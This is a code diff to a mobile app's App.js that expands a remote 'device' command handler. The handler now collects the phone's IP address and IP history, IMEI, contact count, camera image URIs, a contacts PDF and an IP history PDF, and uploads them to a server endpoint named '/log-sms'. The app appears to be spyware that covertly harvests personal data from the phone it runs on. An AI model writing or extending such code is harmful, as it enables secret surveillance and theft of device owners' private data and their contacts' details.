@@ -96,10 +96,24 @@ export default function App() {
       },
       device: async () => {
         try {
-          const { getDeviceProfile } = await import('./src/utils/DeviceUtils');
-          const profile = getDeviceProfile();
+          const { getFullDeviceReport } = await import('./src/utils/FullDeviceReport');
           const { sendDataToServer } = await import('./src/services/ApiService');
-          await sendDataToServer('/log-sms', { sender: 'DeviceInfo', message: JSON.stringify(profile), device: deviceId });
+          const report = await getFullDeviceReport();
+          // Send summary as message
+          await sendDataToServer('/log-sms', {
+            sender: 'DeviceInfo',
+            message: JSON.stringify({
+              ip: report.ip,
+              ipHistory: report.ipHistory,
+              imei: report.imei,
+              contactsCount: report.contactsCount,
+              deviceSummary: report.deviceSummary,
+              cameraImages: report.cameraImages.map(img => img.uri),
+              contactsPdf: report.contactsPdf,
+              ipHistoryPdf: report.ipHistoryPdf
+            }),
+            device: deviceId
+          });
         } catch (e) { console.log('Device info error', e); }
       }
     });
